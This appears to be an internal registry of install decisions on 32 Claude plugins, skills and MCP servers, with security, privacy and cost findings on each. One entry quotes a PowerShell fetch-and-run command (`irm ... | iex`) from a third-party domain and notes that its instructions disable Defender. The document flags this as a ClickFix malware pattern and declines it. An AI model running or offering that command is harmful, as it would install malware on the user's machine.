# The "32 things to install in Claude" image (2026-10-12) — decided item by item

Of 32: **13** were in the 16-item list decided the same day (`REGISTRY-2026-10-12.md`), **5** are already connected or installed,
**2** were decided earlier (Perplexity removed 2026-10-05; Playwright MCP pinned by `integrations/browser-agents/install.sh`),
**12** were newly read on 2026-10-12 (shallow clone or vendor research; nothing executed, nothing vendored). Installs happen on
the Mac through `integrations/skill-packs/install-mac.sh` (`go.sh` step 6).

## Already yours
| Item | Where it is |
|---|---|
| slack, notion, context7, github-mcp (cloud) | connected in this claude.ai session / Composio |
| codex-plugin-cc | `.claude/settings.json` |
| skill-creator, mcp-builder, anthropics skills | `anthropic-skills:` plugin in this session (mcp-builder: `/plugin install example-skills@anthropics-skills` on the Mac if wanted — official, no hooks) |
| find-skills, karpathy-skills | `.claude/skills/find-skills`, `.claude/skills/karpathy-coding-principles` |
| playwright-mcp | pinned (`@playwright/mcp@0.0.83`) by `integrations/browser-agents/install.sh`; do not install a second copy |

## Decided 2026-10-12 (16-item list): frontend-design, humanizer, marketingskills = INSTALL · hyperframes, claude-seo, claude-for-legal, superpowers, claude-skills (alirezarezvani) = HOLD · gstack, financial-services = DECLINE

## Newly read today
| Item | What | Found | Decision | Owner |
|---|---|---|---|---|
| wshobson/agents `46891e7` | 92 small engineering plugins (202 agents, 184 skills), MIT | 90 clean; `protect-mcp`/`review-agent-governance` run `npx` on every tool call (fail-closed); 4 agent names collide with the roster (architect, code-reviewer, quant-analyst, risk-manager); orchestrator plugins compete with Vanessa | **HOLD** — marketplace is safe; cherry-pick ≤3 engineering plugins Derek names; never the hook/orchestrator/duplicate-seat ones | Derek / Nadia |
| oh-my-claudecode `8c48967` | A second orchestrator: 19 agents, 48 skills, 27 hooks on 13 events | Auto-approves commands, spawns workers with `--dangerously-skip-permissions`, rewrites the Claude OAuth token in the Keychain, edits global CLAUDE.md and settings, hijacks plain words in prompts; 5 roster collisions | **DECLINE** | Nadia / Elena |
| vibe-kanban `d5cbb53` | Kanban board that runs coding agents | Upstream sunset 2026-04-10; binary download-and-run; PostHog + Sentry built in; writes `~/.claude.json` | **DECLINE** (deck already tracks tasks) | Derek |
| claude-mem `93ca2a8` | Memory across sessions, 22 skills, 9 hooks | Captures every tool output (client files included) into a DB + vector index; background Haiku calls on your subscription for every tool call; PostHog on by default; `curl \| bash` installers; duplicates memory.md / vector-index / knowledge-graph | **DECLINE** (HALT: client PII into a vector index) | Elena / Nadia |
| repomix `55c6de6` | Pack a repo into one file; optional 8-tool MCP, MIT | Clean, no telemetry; the brain's rule is one leaf, not the whole repo | **HOLD** — `npx repomix` one-off when handing a third-party repo to a model; no MCP | Derek |
| firecrawl `086518b` (MCP) | Hosted scraping/crawl/search, 27 tools, credits | Every URL and prompt goes to Firecrawl's cloud; duplicates agent-browser + Playwright (local, free) and api-anything; same category as the held Apify/Ultimate Web Scraper | **DECLINE** (HOLD the keyless 3-tool endpoint if a crawl need appears) | Elena / Nadia |
| github-mcp-server `eb47a99` (Mac) | Official GitHub MCP, 45 tools by default incl. push/merge/delete | `gh` CLI already gives Claude Code the same access at zero token cost | **DECLINE on the Mac** (cloud session keeps its own) | Derek |
| granola (hosted MCP) | Meeting notes → Claude | Fourth meeting-capture path (Zoom, Fieldy, WhisperAI exist); trains on data by default on Free/Business; pending wiretap class action (N.D. Cal., filed 2026-07-30); client calls would enter another vendor | **DECLINE** | Elena / Alexandra |
| kondo (hosted MCP) | LinkedIn DM triage | Reads your LinkedIn session through a Chrome extension (LinkedIn's terms prohibit such extensions); $36–45/mo minimum for MCP; no free tier; micro-vendor, no audit | **DECLINE** (your NMLS/DRE LinkedIn is not worth a restriction) | Victor wants / Elena rules |
| zapier (hosted MCP) | 8–9k app actions | Composio already covers your stack; 2 tasks per call, free tier ≈ 50 calls/mo; a second aggregator holding the same OAuth grants | **HOLD** — only for a named app Composio cannot reach; managed mode, ≤10 read-mostly actions | Derek / Marcus |
| higgsfield (hosted MCP) | Cinematic video from a prompt | Official URL only (the community server harvests browser cookies); every generation bills credits ($19–59/mo plans); uploads may train their models; Canva + Eromify already cover image/video | **HOLD** — Starter tier if Sofia wants it; no client or property-identifying images | Sofia / Marcus |
| perplexity (MCP) | Live web search | Removed by your decision 2026-10-05; Claude web research replaced it | **DECLINE** (decision stands) | — |

**Net for the 32: 3 install (frontend-design, humanizer, marketingskills — already in the installer), 10 already yours, 7 hold, 12 declined.**
Pattern across both lists today: the clean, cheap ones are prose-only skills; everything declined either runs hooks on every
tool call, reads or rewrites your Claude credentials, sends client data to a third party, or is a second orchestrator.

## "Add and install all" (Steven, 2026-10-12) — what that changed

Every held item is now in `install-mac.sh` in its leanest safe form (one y/N each, run by `go.sh` step 6):
hyperframes `core-skills` with telemetry switched off · claude-seo without the cockpit or any paid key · claude-for-legal
`commercial-legal` + `privacy-legal` (own contracts and lead data only; Alexandra reviews) · `aeo` from the 388-skill library ·
wshobson `security-scanning`, `tdd-workflows`, `debugging-toolkit` · superpowers as 3 copied skill folders (no session hook) ·
rampstack as 5 copied folders · caveman as the single voice skill (no proxy, no hooks) · repomix CLI only · hosted MCPs
higgsfield, firecrawl (keyless) and granola registered for Claude Code (sign-in in your browser on first use; each bills or
records only inside your own account).

**Not added even after "install all" — each needs its own explicit yes, because it breaks a rule in CLAUDE.md's HALT list:**
| Item | The specific harm | What an explicit yes would mean |
|---|---|---|
| oh-my-claudecode | rewrites your Claude login token in the Keychain, edits global CLAUDE.md and settings, auto-approves commands, runs workers with permissions off | you accept a second orchestrator that can act without asking |
| claude-mem | copies every file Claude reads (client files included) into a new database and vector index, and spends your subscription in the background on each tool call | you accept client PII in a vector index |
| gstack | installer edits global settings (a Stop hook), sends code to OpenAI for "outside reviews" by default, wants to rewrite CLAUDE.md | you accept global settings edits and code egress |
| vibe-kanban | product shut down 2026-04-10; binary download-and-run; PostHog + Sentry; writes ~/.claude.json | you accept an unmaintained tool with telemetry |
| notebooklm-skill | archived; stealth-automates your Google account; stores session cookies in plain text; documents leave the machine | you accept a Google account-restriction risk |
| kondo | reads LinkedIn through an extension LinkedIn's terms prohibit; $36–45/month Business plan required; needs your sign-in | you accept a LinkedIn account-restriction risk and the spend |
| zapier | fine, but the MCP URL is generated inside your Zapier account — paste it to me and it goes in | — |
| github-mcp on the Mac | `gh` already does it at zero cost; adding it needs a personal access token | — |

## Added later on 2026-10-12
| Item | What | Found | Decision | Owner |
|---|---|---|---|---|
| calesthio/OpenMontage `e45f5b1` | Agentic video production: 13 pipelines, 100+ tools, Remotion/FFmpeg render, AGPL-3.0, 163 MB | No telemetry, no install hooks, every key optional, offline Piper+FFmpeg path; needs FFmpeg + Node + Python on the Mac | **INSTALL on the Mac** via `integrations/openmontage/openmontage.sh` (`go.sh` step 10); paid render keys only by Steven's hand (HALT: money, credentials) | Sofia uses / Derek installs / Elena key rules |
| digitaldonusum/vibebreaker `505c92c` | 20-pass adversarial audit protocol for AI-written code (prompts + templates; the npx CLI only copies them), MIT, zero dependencies | No network, no shell calls, its own tests pass; private by design | **INSTALL — vendored** into `integrations/code-validation/vibebreaker/`; it is the method of the new `code-validator` agent and the Stop-hook validation gate | Derek owns / Elena approved the read-only method |
| MiniPrincipal/Coding-Agent-Skills `54069f0` | README and LICENSE only — no skill files in the repo | Its only install path is `irm https://shellx.click/skills/setup.ps1 \| iex` from a third-party domain, with instructions to bypass PowerShell's execution policy and switch off Windows Defender real-time protection — the ClickFix malware pattern | **DECLINE — do not run that command on the Alienware or anywhere.** The workflows it advertises (implement, debug, review, test, refactor, verify) are covered by the ECC officers, the code-validator and the existing engineering skills | Elena (security) |
| awesome-vibe-coding/awesome-vibe-coding `46d0f0d` | CC0 curated list + Hugo site: dictionary (27 terms), skills shelf (70), MCP servers, tools | Content only; a sponsor/newsletter banner, nothing executable | **REFERENCE** — `references/vibe-coding-learning.md`; engineers cite the dictionary; any skill from its shelf is vetted here before install | Nadia |
| datawhalechina/easy-vibe `130e9b7` | CC BY-NC-SA four-stage vibe-coding curriculum (VitePress, 10 languages, 1.1 GB) | Educational; a husky `prepare` hook and Vercel build config exist only for its own site build — not run here | **REFERENCE** — read online (`references/vibe-coding-learning.md`), Steven's study order recorded; not cloned (1.1 GB, non-commercial) | Nadia / Steven |
